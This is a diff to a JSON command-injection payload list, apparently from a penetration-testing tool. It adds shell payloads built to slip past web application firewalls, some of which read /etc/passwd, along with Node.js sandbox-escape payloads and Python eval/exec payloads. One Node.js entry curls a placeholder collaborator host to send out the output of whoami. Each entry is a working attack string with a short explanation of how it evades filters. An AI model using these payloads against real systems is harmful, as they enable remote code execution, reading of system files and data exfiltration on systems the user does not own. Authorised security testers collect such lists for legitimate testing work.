@@ -54,7 +54,11 @@
         {"payload": "c${z}at /etc/passwd", "description": "Null variable to break cat keyword", "waf_bypass": true},
         {"payload": "${PATH%%u*}ml", "description": "Bash parameter expansion — builds command from PATH variable without blocked chars", "waf_bypass": true},
         {"payload": "$(tr '[a-z]' '[A-Z]'<<<'id'|tr '[A-Z]' '[a-z]')", "description": "Case conversion via tr to avoid keyword filters", "waf_bypass": true},
-        {"payload": "a]b]c]d]e; id", "description": "Bash brace/bracket confusion — confuse simple WAF regex parsers", "waf_bypass": true}
+        {"payload": "a]b]c]d]e; id", "description": "Bash brace/bracket confusion — confuse simple WAF regex parsers", "waf_bypass": true},
+        {"payload": "echo${IFS}$(id)", "description": "IFS as space replacement with subshell — avoids space and semicolon characters", "waf_bypass": true},
+        {"payload": "$(echo${IFS}aWQ=|base64${IFS}-d)", "description": "Base64 decode chain — encodes 'id' as base64 to bypass keyword filters", "waf_bypass": true},
+        {"payload": "$(printf '\\x69\\x64')", "description": "Printf hex encoding — constructs 'id' from hex escape sequences", "waf_bypass": true},
+        {"payload": "${PATH:0:1}${PATH:9:1}${PATH:4:1}${IFS}${PATH:0:1}etc${PATH:0:1}passwd", "description": "PATH variable slicing — builds '/cat /etc/passwd' entirely from environment variable substrings", "waf_bypass": true}
       ]
     },
     "blind_oob": {
@@ -78,6 +82,26 @@
         {"payload": "shell_exec('id')", "description": "PHP shell_exec() call", "waf_bypass": false},
         {"payload": "exec('id')", "description": "PHP exec() call", "waf_bypass": false},
         {"payload": "${system(id)}", "description": "PHP complex syntax injection", "waf_bypass": true}
+      ]
+    },
+    "nodejs": {
+      "description": "Node.js command injection via eval(), child_process, or template string contexts",
+      "payloads": [
+        {"payload": "require('child_process').execSync('id').toString()", "description": "Direct child_process execSync — works when input is passed to eval() or vm.runInContext()", "waf_bypass": false},
+        {"payload": "require('child_process').exec('curl http://COLLABORATOR_URL/$(whoami)')", "description": "Async exec with OOB callback — fire-and-forget command with DNS/HTTP exfil", "waf_bypass": false},
+        {"payload": "global.process.mainModule.require('child_process').execSync('id').toString()", "description": "Global process chain — bypasses sandboxes that don't expose require directly", "waf_bypass": true},
+        {"payload": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()", "description": "Constructor chain escape — bypasses vm2/sandbox restrictions via Function constructor", "waf_bypass": true},
+        {"payload": "1;var x=global.process.mainModule.require;x('child_process').execSync('id').toString()", "description": "Variable assignment bypass — splits require chain to evade single-expression filters", "waf_bypass": true}
+      ]
+    },
+    "python": {
+      "description": "Python command injection via eval(), exec(), or unsafe deserialization contexts",
+      "payloads": [
+        {"payload": "__import__('os').system('id')", "description": "Direct __import__ os.system — works when input is passed to eval() or exec()", "waf_bypass": false},
+        {"payload": "__import__('os').popen('id').read()", "description": "__import__ with popen — captures command output instead of just exit code", "waf_bypass": false},
+        {"payload": "__import__('subprocess').check_output('id',shell=True).decode()", "description": "Subprocess injection — full output capture via check_output", "waf_bypass": false},
+        {"payload": "eval(compile('import os;os.system(\"id\")','','exec'))", "description": "Compile-based eval — bypasses single-expression eval() restriction using compile()", "waf_bypass": true},
+        {"payload": "().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('id')", "description": "Object subclass chain — accesses os module without direct import, bypasses import restrictions", "waf_bypass": true}
       ]
     }
   }
